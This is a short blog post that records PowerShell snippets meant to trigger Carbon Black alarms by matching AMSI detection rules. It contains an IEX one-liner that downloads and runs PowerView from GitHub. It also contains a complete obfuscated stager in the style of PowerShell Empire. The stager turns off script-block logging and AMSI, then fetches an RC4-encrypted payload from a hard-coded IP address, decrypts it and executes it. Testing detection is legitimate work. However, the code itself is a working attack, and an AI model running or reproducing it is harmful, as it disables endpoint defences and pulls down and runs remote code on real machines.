---
title: 'Trigger CBC Alarms with Powershell'
author: RichMason
layout: post
permalink: /cbc-alarm-psh/
categories:
  - Tech
---
This Post is to record powershell scripts that trigger CBC alarms by matching AMSI detection rules.

Download Powerview

```powershell
IEX (New-Object net.webclient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1")
```

Attempt to disable AMSI with Powershell

```powershell
IF($PSVersionTaBLE.PSVeRSiON.MAJOr -GE 3)
{
        $GPS=[ref].ASSeMBlY.GetTYPe('System.Management.Automation.Utils')."GetFIE`ld"('cachedGroupPolicySettings','N'+'onPublic,Static').GetValUE($nuLl);
        If($GPS['ScriptB'+'lockLogging'])
        {
                $GPS['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}ElSE{[SCrIPTBlOCk]."GetFiE`lD"('signatures','N'+'onPublic,Static').SetValue($null,(NEW-OBJeCT ColleCtions.Generic.HAShSET[StRing]))
        }
        [REf].ASSeMbLY.GETTyPe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIeLD('amsiInitFailed','NonPublic,Static').SetVaLUE($null,$trUE)};};[SYsTEm.NEt.SeRvIcEPoIntMANAgEr]::ExPECT100ConTiNUe=0;$Wc=New-OBJECt SySteM.NEt.WebClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadErS.ADd('User-Agent',$u);$wc.ProXY=[SYStem.NeT.WEBREqUest]::DeFAULTWEbPRoXy;$wC.PrOxy.CREDENTiaLs = [SySteM.NEt.CReDEnTIaLCacHe]::DeFaultNeTWOrkCrEdenTIAls;$Script:Proxy = $wc.Proxy;$K=[SystEM.TEXT.ENCOdINg]::ASCII.GEtByTEs('40fdfa431a1dafe7a431f7a863ceaa6f');$R={$D,$K=$ARgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BxOR$S[($S[$I]+$S[$H])%256]}};$ser='http://185.61.149.214:443';$t='/admin/get.php';$Wc.HeaDErS.ADD("Cookie","session=LfFhUgtZf0RnNOmVinVLjzi2K0s=");$daTA=$WC.DOWnLOAdDAta($SEr+$t);$Iv=$dATa[0..3];$DAtA=$DaTA[4..$DatA.LeNGTH];-join[Char[]](& $R $dAtA ($IV+$K))|IEX

```
